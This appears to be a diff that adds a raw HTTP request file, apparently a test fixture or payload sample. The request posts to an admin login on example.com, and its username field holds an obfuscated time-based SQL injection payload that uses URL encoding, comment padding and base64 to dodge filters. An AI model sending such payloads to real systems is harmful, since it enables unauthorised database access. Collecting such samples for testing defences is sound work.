@@ -1,0 +1,9 @@
+POST /admin HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 133
+
+username=%27%250bCHAR%2879%2C82%29/%2A%2A/decode%28%27IE9SIEJFTkNITUFSSyg3NTM4MTcsIE1ENSgxKSktLQ%3D%3D%27%2C/%2A%2A/%27base64%27%29--
